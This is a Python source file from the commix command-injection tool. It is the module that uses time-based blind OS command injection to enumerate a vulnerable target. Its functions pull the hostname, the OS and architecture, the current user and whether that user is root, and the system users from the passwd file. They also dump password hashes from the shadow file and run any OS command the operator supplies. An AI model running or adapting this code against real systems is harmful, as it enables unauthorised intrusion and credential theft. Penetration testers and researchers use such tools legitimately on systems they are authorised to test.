#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import sys
import time

from src.utils import menu
from src.utils import settings

from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.blind_based.techniques.time_based import tb_injector

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

      
"""
Hostname enumeration
"""
def hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
  cmd = settings.HOSTNAME
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  shell = output 
  if shell:
    shell = "".join(str(p) for p in output)
    sys.stdout.write(Style.BRIGHT + "\n\n  (!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
    sys.stdout.flush()
  

"""
Retrieve system information
"""
def system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):  
  cmd = settings.RECOGNISE_OS            
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  target_os = output
  if target_os:
    target_os = "".join(str(p) for p in output)
    if target_os == "Linux":
      cmd = settings.RECOGNISE_HP
      check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
      target_arch = output
      if target_arch:
        target_arch = "".join(str(p) for p in target_arch)
        sys.stdout.write(Style.BRIGHT + "\n\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
        sys.stdout.flush()
    else:
      sys.stdout.write(Style.BRIGHT + "\n  (!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
      sys.stdout.flush()


"""
The current user enumeration
"""
def current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
  cmd = settings.CURRENT_USER
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  cu_account = output
  if cu_account:
    cu_account = "".join(str(p) for p in output)
    # Check if the user have super privileges.
    if menu.options.is_root:
      cmd = settings.ISROOT
      check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
      is_root = output
      if is_root:
        sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
        if is_root != "0":
            sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "not" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
            sys.stdout.flush()
        else:
          sys.stdout.write(Style.BRIGHT + " and it is " + Style.UNDERLINE + "" + Style.RESET_ALL + Style.BRIGHT + " privilleged" + Style.RESET_ALL + ".\n")
          sys.stdout.flush()
    else:
      sys.stdout.write(Style.BRIGHT + "\n\n  (!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
      sys.stdout.flush()
    

"""
System users enumeration
"""
def system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
  sys.stdout.write("\n(*) Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
  sys.stdout.flush()
  cmd = settings.SYS_USERS             
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  sys_users = output
  if sys_users :
    sys_users = "".join(str(p) for p in sys_users)
    sys_users = sys_users.replace("(@)", "\n")
    sys_users = sys_users.split( )
    if len(sys_users) != 0 :
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users)) + " entries in '" + settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      count = 0
      for line in sys_users:
        count = count + 1
        fields = line.split(":")
        # System users privileges enumeration
        if menu.options.privileges:
          if int(fields[1]) == 0:
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
          elif int(fields[1]) > 0 and int(fields[1]) < 99 :
            is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + "  system user "
          elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
            if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
            elif int(fields[1]) == 60002:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
            else:
              is_privilleged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
          else :
            is_privilleged = ""
        else :
          is_privilleged = ""
        print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + ").Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
    else:
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL


"""
System passwords enumeration
"""
def system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell): 
  sys.stdout.write("\n(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
  sys.stdout.flush()
  cmd = settings.SYS_PASSES            
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  sys_passes = output
  if sys_passes :
    sys_passes = "".join(str(p) for p in sys_passes)
    sys_passes = sys_passes.replace("(@)", "\n")
    sys_passes = sys_passes.split( )
    if len(sys_passes) != 0 :
      sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
      sys.stdout.flush()
      count = 0
      for line in sys_passes:
        count = count + 1
        fields = line.split(":")
        if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
          print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
    else:
      print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL


"""
Single os-shell execution
"""
def single_os_cmd_exec(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
  cmd =  menu.options.os_cmd
  check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
  return check_how_long, output


"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell):
  
  if menu.options.hostname:
    hostname(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
    settings.ENUMERATION_DONE = True

  if menu.options.current_user:
    current_user(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
    settings.ENUMERATION_DONE = True

  if menu.options.sys_info:
    system_information(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
    settings.ENUMERATION_DONE = True

  if menu.options.users:
    system_users(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
    settings.ENUMERATION_DONE = True

  if menu.options.passwords:
    system_passwords(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
    settings.ENUMERATION_DONE = True

  if settings.ENUMERATION_DONE == True:
    print ""

# eof